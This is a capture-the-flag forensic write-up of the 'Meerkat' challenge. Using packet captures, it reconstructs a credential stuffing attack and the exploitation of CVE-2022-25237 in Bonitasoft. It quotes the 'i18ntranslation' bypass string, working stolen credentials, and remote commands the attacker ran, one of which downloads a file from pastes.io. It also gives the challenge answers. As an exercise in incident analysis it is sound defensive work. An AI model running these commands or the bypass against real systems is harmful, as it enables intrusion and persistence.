# Meerkat-Analysis-Report
By analyzing a Wireshark scan report, I solved 'Meerkat', a Sherlocks type problem, which is documented in this repository.

![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/2ea41d92-134e-4803-b7d4-2c07fc2f8180)

Hare we download the zip file. After download we extract file with the given password.

### Task 1
We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?

Starting with our .pcap file, we can pop that open in Wireshark and check the Endpoints table to get a feel for what IP addresses may be involved in whatever might have happened.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/a1583f37-cac5-49c1-9219-a9088f14fb3a)

![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/5e01d71d-2a86-4b24-b16d-11cb010201d8)
Sorting by packets under the TCP table, we can see the local host 172.31.6.44 (which we can assume to be the business management platform or an endpoint within the company) is receiving a majority of its traffic on ports 37022, 8080, 61254, 61255, and 22. TCP 37022, 61254, and 61255 are not registered for any specific services, but 8080 is an HTTP alternative and 22 is for SSH. Based on this, we can reasonably assume we’re looking at a web server.

We can see additional, notable amounts of traffic from foreign hosts 54.144.148.213, 95.181.232.30, 138.199.59.221,156.146.62.213. TCP traffic to a web server in and of itself is not immediately suspicious, so we’ll just note this down for now.

Diving into the actual stream of packets, we’ll filter by tcp.port == 8080 && ip.dst == 172.31.6.44 to take a look at some of that inbound traffic.

Right out the gate, we see an HTTP request that gives us some information on our web server.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/cb2b84b4-4dd5-44d8-b415-f24e67c0983d)
“GET /bonita HTTP/1.1” is associated with the Bonitasoft Business Process Management Software. That tells us the platform the business chose to use and a starting point when hunting for potential exploited vulnerabilities.
### Task 1 ans: Bonitasoft

### Task 2
We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?

Browsing through Wireshark some more, we can see several POST requests made to /bonita/loginservice all from the same IP address, 156.146.62.213, each within several seconds of each other.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/be06fea5-e5ee-46bf-b72e-650c9e91d76a)

Digging into the form items of each request, we find different usernames and passwords being submitted.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/d7fd3fff-8ee8-4381-8d74-c867af45abfd)
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/aae2ff5f-1fd8-4713-af89-a909193d3a73)

Based on all the traffic originating from the same IP address and the rate at which they’re being submitted, this is likely a brute force attack. Specifically, based on the usage of sets of credentials as opposed to testing multiple usernames with a single password at a time or vice versa, we can conclude this is a credential stuffing attack.
### Task 1 ans: Credential Stuffing

### Task 3
Does the vulnerability exploited have a CVE assigned - and if so, which one?

We can start searching for alerts that document this attack by searching for instances of 'Login' in our JSON file. It's a good thing we have a strong lead immediately.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/f3352485-42f5-45d9-8a70-d9343006bf36)
Investigating CVE-2022-25237, we found a critical vulnerability affecting Bonita Web 2021.2. This confirms that this is likely related to the POST requests we saw earlier.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/64d8cc5e-ed45-4cf1-9ae8-da3ea499bf80)
### Task 3 ans: CVE-2022–25237

### Task 4 
Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?

The vulnerability works by adding 'i18ntranslation' in one of two variations to the end of a URL, which results in access to privileged API endpoints that could lead to remote code execution.
### Task 4 ans: i18ntranslation

### Task 5
How many combinations of usernames and passwords were used in the credential stuffing attack?

By using the 'http' filter in Wireshark, we were able to improve our understanding of the traffic that caused this attack.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/12fa167c-4d9f-4fb6-a324-b60c47d75e85)
We observed a flow of POST requests that were each followed by a 401 code, indicating that the credentials were invalid. A total of 56 unique sets of username-password combinations were utilized.
### Task 5 ans: 56

### Task 6
Which username and password combination was successful?

![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/6abd759c-d504-4da2-86b9-58bbfa0a7a69)
The username'seb.broom@forela.co.uk' and password 'g0vernm3nt' are used to try to login and get HTTP code 204, which means that authentication was successful. A total of four calls are made to the Bonita API. The CVE we identified shows that these are the credentials that were successfully breached.
### Task 6 ans: seb.broom@forela.co.uk:g0vernm3nt

### Task 7
If any, which text sharing site did the attacker utilise?

Following the successful authentication, the attacker performs a POST request to upload a file entitled “rce_api_extension.zip”.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/6005c4a5-96a8-4985-af20-ccfa42effd31)
After doing some research, we discovered the zip file in a Github repository that contained the proof-of-concept created by Rhino Security Labs during the initial disclosure of the vulnerability to Bonitasoft. This would be the best confirmation that this attack is caused by CVE-2022-25233.
The zip file is further interacted with by a subsequent POST request to set it properly within the web server’s storage.
Immediately following this upload and setup, we encounter an especially troubling GET request to the server.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/fd3dfb86-a357-4092-8e7f-d6345c4fa428)

The 'cmd' parameter is set to 'whoami', a command that allows the attacker to identify the current user they are logged into. The server's response is encoded in JSON in the next HTTP packet, as usual.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/3942ccab-7325-4bb1-be90-7eade35ee188)

The attacker has been able to gain root access to the web server, essentially granting them complete control. The attacker removes the zip file to conceal evidence of compromise while enumerating the web server.
Continuing our investigation, the attacker resumes testing username-password combinations before returning to the successful set of credentials.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/b4a6c256-43b9-4724-9201-7a066f56a761)
It's interesting that the attacker's IP address changes from 156.146.62.213 to 138.199.59.221. It is possible that this is a result of them changing their VPN, connecting from a different network, or upgrading their system.

Regardless, we can assume this is the same attacker or at the least someone connected to the original attacker as they pick up with the same attack the original IP address was used within one minute of the end of the brute force attack. 
To log back in, they use the cracked credentials, upload rce_api_extension.zip again, set it up as before, and then run another set of commands through a GET request. This time, they execute “cat /etc/passwd” to enumerate the usernames of all users set up on the web server as well details on each account. 
Once more, they delete the zip file to cover up their tracks.

This is where something new happens. The attacker uploads the zip file again like they did previously and issues a command through a GET request, but this time the command is "wget https://pastes.io/raw/bx5gcr0et8".
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/264ab3d1-9d09-421c-a39b-4866ad331ad1)
The attacker is downloading something to the web server using the text sharing site “pastes.io”.
### Task 7 ans: pastes.io

### Task 8
Please provide the filename of the public key used by the attacker to gain persistence on our host.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/e428cd20-e122-432a-97f0-18ecd340f06a)
Before restarting the ssh service on the server, the attacker uploaded a bash script to the web server that downloads another text file from a different link and stores it in the authorized ssh RSA keys. 
This script file will be hashed to be added to EDRs and other security controls later to detect any further attempts to use it.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/369fda07-4d20-4acd-bc66-284aedfb8fbb)
We’ll go ahead and following the link to the other file used in the first script the attacker uploaded. Going to that webpage, we’re once again met with raw text.

![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/b3c133b0-6b8b-4840-92c4-8e08aaf04e66)
What’s happened is the attacker has successfully uploaded a known RSA key to the authorized ssh keys on the web server. Doing this enables them to connect to the web server over ssh using the matching private key, granting persistence.
We’ll hash this file as well to add to our filters.
![image](https://github.com/Mayukh-Ghara/Meerkat-Analysis-Report/assets/59330372/e146865a-169a-4eb9-9add-7f363b7c0c69)

### Task 8 ans: hffgra4unv

### Task 9
Can you confirmed the file modified by the attacker to gain persistence?

Reviewing the previous file we analyzed, we can see that the new SSH key was being append to the keys stored in /home/ubuntu/.ssh/authorized_keys.
### Task 9 ans: /home/ubuntu/.ssh/authorized_keys

### Task 10
Can you confirm the MITRE technique ID of this type of persistence mechanism?

We found that the attacker's actions corresponded with SSH Authorized Keys (T1098.004) under Account Manipulation in the Persistence column after investigating MITRE's ATT&CK Matrix.
### Task 10 ans: T1098.004
